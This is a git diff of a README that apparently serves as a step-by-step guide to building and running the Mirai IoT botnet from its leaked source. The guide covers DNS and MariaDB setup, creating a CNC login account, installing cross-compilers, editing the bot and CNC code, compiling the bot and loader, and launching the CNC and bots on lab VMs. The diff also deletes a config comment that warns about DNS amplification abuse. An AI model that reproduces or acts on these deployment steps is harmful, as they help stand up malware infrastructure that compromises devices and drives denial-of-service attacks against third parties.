@@ -1,4 +1,4 @@
-# Experiment-Build-a-MIRAI-botnet
+# Build-a-Mirai-botnet
 In this Experiment, I found a way to build a MIRAI botnet.
 
 An installation guide has been given by Mirai's author:
@@ -9,7 +9,7 @@ https://github.com/jgamblin/Mirai-Source-Code/blob/master/ForumPost.md
 2. Network capabilities.
 3. VMware-station or vbox.
 
-### Install Requirements
+# *Requirements*
 ```bash
 dnf install git gcc golang ElectricFence mysql mariadb-server mariadb-common bind bind-utils
 dnf groupinstall "Development Tools" -y
@@ -18,7 +18,8 @@ dnf install gmp-devel -y
 
 ## Section 1 Setup dns server
 ### 1-1 Stop Dns server
-systemctl stop named
+```bash systemctl stop named
+```
 ### 1-2 Edit /etc/named.conf
 ```conf
 acl "trusted" {
@@ -33,16 +34,6 @@ options {
 	memstatistics-file "/var/named/data/named_mem_stats.txt";
 	allow-query     { any; };
 
-	/* 
-	 - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.
-	 - If you are building a RECURSIVE (caching) DNS server, you need to enable 
-	   recursion. 
-	 - If your recursive DNS server has a public IP address, you MUST enable access 
-	   control to limit queries to your legitimate users. Failing to do so will
-	   cause your server to become part of large scale DNS amplification 
-	   attacks. Implementing BCP38 within your network would greatly
-	   reduce such attack surface 
-	*/
 	recursion yes;
 
 	dnssec-enable yes;
@@ -81,15 +72,27 @@ zone "changeme.com" IN {
 	allow-update { none; };
 };
 ```
-### 1-4 [Finally] Restart named
+### 1-4 Restart named
 ```bash
-systemctl restart named
+systemctl start named
 ```
 
 ## Section 2 Setup mariadb-server mirai databases
+### 2-1 Create mysql root password
+```bash
+mysqladmin -u root password password
+```
+### 2-2 Run ./scripts/db.sql
+```bash
+cat ./scripts/db.sql | mysql -uroot -p
+```
+### 2-3 Add cnc login account
+```mysql
+INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
+```
 
-## Section 1 Compile Mirai code
-### 1-1 Download the Mirai code
+## Section 3 Compile Mirai code
+### 3-1 Download the Mirai code
 ```bash
 git clone https://github.com/jgamblin/Mirai-Source-Code.git
 
@@ -125,11 +128,11 @@ mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-armv6l armv6l
 ```
-### 1-2 Make go home DIR
+### 3-2 Make go home DIR
 ```bash
 mkdir ~/go
 ```
-### 1-3 Adding xcompile path in .bashrc
+### 3-3 Adding xcompile path in .bashrc
 ```bash
 export PATH=$PATH:/etc/xcompile/armv4l/bin
 export PATH=$PATH:/etc/xcompile/armv6l/bin
@@ -149,8 +152,61 @@ export GOPATH=$HOME/go
 ```bash
 source ~/.bashrc
 ```
-### 1-4 Install GoLang Drivers
+### 3-4 Install GoLang Drivers
 ```bash
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellword
 ```
+### 3-5 Edit Mirai code
+*Edit ./mirai/bot/resolv.c DNS server ip*
+```c
+struct resolv_entries *resolv_lookup(char *domain)
+{
+    /*
+       Missing code ...
+     */
+    util_zero(&addr, sizeof (struct sockaddr_in));
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INET_ADDR(192,168,241,1); //Change here
+    addr.sin_port = htons(53);
+
+    /*
+       Missing code ...
+     */
+}
+
+```
+*Edit ./mirai/cnc/main.go*
+```go
+const DatabaseAddr string   = "127.0.0.1"
+const DatabaseUser string   = "root"
+const DatabasePass string   = "password" //Change here
+const DatabaseTable string  = "mirai"
+```
+*Edit ./mirai/cnc/admin.go*
+```go
+headerb, err := ioutil.ReadFile("/root/Mirai_Code/mirai/prompt.txt") //Change here
+```
+### 3-6 Compile
+```bash
+cd ./mirai
+./build.sh debug telnet
+./build.sh release telnet
+cd ../loader
+./build.sh
+```
+
+## Section 4 Run Mirai Net
+### 4-1 Run ./mirai/debug/cnc as root on PC:192.168.241.1
+```bash
+./mirai/debug/cnc
+```
+### 4-2 Telnet cnc
+```bash
+telnet 127.0.0.1
+```
+### 4-3 Run ./mirai/debug/mirai.dbg as root on VM-PCs
+VM-PC1:192.168.241.108
+VM-PC2:192.168.241.109
+VM-PC3:192.168.241.110
+
